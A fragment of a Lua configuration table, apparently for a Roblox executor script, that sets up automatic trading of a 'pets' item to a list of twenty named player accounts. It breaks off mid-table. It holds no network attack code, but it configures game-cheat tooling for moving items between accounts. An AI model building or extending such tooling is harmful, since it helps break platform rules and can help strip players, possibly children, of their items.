  getgenv().Utility = {
        ...
        AutoTrade = {
            ...
            Usernames = {"AvaGang53", "Ember2CoolTycoonVibe", "emBeRBuNNy198", "EmberZone26", "EzraSpeed103RBX", "FinnRavenPal", "fuzfinnpuffinvibes18", "Ja5xRR3mypro", "Jackson38SADiecobrav", "L1lNov4SkatesRBX", "M1niMightyDuckKidSto", "MightyDrawsgaming", "NebulayaBlitz952", "RileyBlox246", "RockyEdits51", "RockyHunter24vibesSl", "ShadowMaxZayneVibes", "SkyeWalker27Crew564", "xXMoch14LifeEagle288", "XzAlphaVITurboeIHero"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
            TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
            Categories = {"pets"}, -- What to send
            Items = {"summer_2026_storm_condor"}, -- Item IDs/names to send when TradeMode = "specific" e.g. {"dog", "cat", "buffalo"}
